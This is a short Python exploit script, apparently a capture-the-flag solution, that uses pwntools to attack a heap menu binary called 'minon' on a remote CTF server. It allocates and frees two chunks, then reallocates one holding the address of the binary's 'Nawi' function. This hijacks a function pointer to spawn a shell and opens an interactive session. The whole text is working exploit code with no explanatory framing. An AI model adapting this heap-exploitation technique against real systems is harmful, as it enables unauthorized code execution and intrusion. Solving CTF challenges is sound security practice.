from pwn import *

p = remote('pwn.battlectf.online', 1006)

#p = process("./minon")

elf = ELF('./public/minon')
get_shell = elf.symbols['Nawi']

def add(size, name):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'>', str(size).encode('utf-8'))
    p.sendafter(b'>', name)
    p.recvuntil(b'> [DEBUG]')

def remove(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'>', str(idx).encode('utf-8'))

def report(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>', str(idx).encode('utf-8'))

add(0x18, b'a'*8)
add(0x38, b'a'*8)

remove(0)
remove(1)

add(0x18, p64(get_shell))

report(0)
p.interactive()
